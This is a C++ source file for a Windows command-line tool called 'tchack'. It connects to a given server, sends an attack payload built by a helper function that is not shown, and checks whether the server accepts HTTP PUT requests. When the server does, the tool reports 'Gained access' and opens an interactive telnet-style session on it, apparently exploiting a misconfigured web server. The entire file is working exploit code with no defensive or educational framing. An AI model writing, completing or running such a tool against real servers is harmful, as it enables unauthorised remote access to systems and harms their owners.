#include "hdr.h"

int main(int argc, char* argv[]) {
    if (argc != 3) {
        cout << "Usage: " << endl << "tchack [target ip] [target port]" << endl;
        return 1;
    }

    WSADATA wd;
    SOCKET sock = INVALID_SOCKET;
    addrinfo* res = NULL, * ptr = NULL, hints;

    if (WSAStartup(MAKEWORD(2, 2), &wd) != 0) {
        cout << "Error starting winsock" << endl;
        return 0;
    }

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    if (getaddrinfo(argv[1], argv[2], &hints, &res) != 0) {
        cout << "The target could not be found." << endl;
        return 0;
    }

    for (ptr = res; ptr != NULL; ptr = ptr->ai_next) {
        sock = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
        if (sock == INVALID_SOCKET) {
            cout << "Error creating socket." << endl;
            return 0;
        }

        if (connect(sock, ptr->ai_addr, (int)ptr->ai_addrlen) == SOCKET_ERROR) {
            closesocket(sock);
            sock = INVALID_SOCKET;
            continue;
        }

        break;
    }

    if (ptr == NULL) {
        cout << "Failed to connect to server" << endl;
        return 1;
    }

    char buf[500];

    string payload = getPayload(argv[1]);
    if (send(sock, payload.c_str(), payload.length(), NULL) == SOCKET_ERROR) {
        cout << "Error sending payload." << endl;
        return 1;
    }

    recv(sock, buf, 11, NULL);
    
    if (string(buf).find("20") == -1) {
        cout << "The target server is immune to this attack because they have the PUT method disabled." << endl;
        return 1;
    }

    cout << "Gained access to " << argv[1] << "!" << endl;
    telnet(sock, buf);

    return 1;
}